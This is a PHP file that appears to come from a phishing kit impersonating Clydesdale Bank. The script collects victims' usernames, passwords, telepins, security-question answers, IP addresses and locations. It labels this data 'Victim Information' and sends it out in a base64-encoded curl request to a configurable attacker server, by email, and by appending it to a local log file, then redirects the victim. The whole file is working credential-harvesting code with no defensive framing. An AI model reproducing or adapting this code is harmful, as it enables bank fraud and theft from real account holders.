<?php
require "../../CONTROLS.php";
require "../../includes/functions.php";

error_reporting(0);
session_start();


date_default_timezone_set('Europe/London');
$date = date('l d F Y');
$time = date('H:i');
$user = $_SESSION['user'];
$telepin = $_SESSION['telepin'];

$pass = $_SESSION['password'];

$q1 = $_POST['q1']." : ".$_POST['a1'];
$q2 = $_POST['q2']." : ".$_POST['a2'];
$q3 = $_POST['q3']." : ".$_POST['a3'];
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$VictimInfo1 = "| IP Address :"." ".$_SERVER['REMOTE_ADDR']." (".gethostbyaddr($_SERVER['REMOTE_ADDR']).")";
$VictimInfo2 = "| Location :"." ".$systemInfo['city'].", ".$systemInfo['region'].", ".$systemInfo['country'];
$VictimInfo3 = "| UserAgent :"." ".$systemInfo['useragent'];
$VictimInfo4 = "| Browser :"." ".$systemInfo['browser'];
$VictimInfo5 = "| Platform :"." ".$systemInfo['os'];
$data = "
+ --------------- CLYDESDALE ---------------+
+ ------------------------------------------+
+ Account Information (Clydesdale)
| User : $user
| Pass : $pass
| Question 1 : $q1
| Question 2 : $q2
| Question 3 : $q3
+ ------------------------------------------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Received : $date @ $time
+ ------------------------------------------+
";
if ($saveSSH == 1) {
 $curl_handle=curl_init();
  curl_setopt($curl_handle,CURLOPT_URL,'http://' . trim($ipSave) . '/index.php?type=banks&data=' . base64_encode($data));
  curl_setopt($curl_handle,CURLOPT_CONNECTTIMEOUT,2);
  curl_setopt($curl_handle,CURLOPT_RETURNTRANSFER,1);

curl_setopt($curl_handle, CURLOPT_HTTPHEADER, array(
    'mrprofessor: ceo',
  
));
  $buffer = curl_exec($curl_handle);
  curl_close($curl_handle);
}

if ($sendEmail === 1) {
	mail($to, 'Bank result from ' . $_SERVER['REMOTE_ADDR'], $data);
}


if ($saveFile == 1) {
	$file = fopen('../../dbauth/index/banks.txt', 'a');
	fwrite($file, $data);
	fclose($file);
}

header('Location: ../../Exit.php?sslchannel=true&sessionid=' . generateRandomString(130));
exit;
?>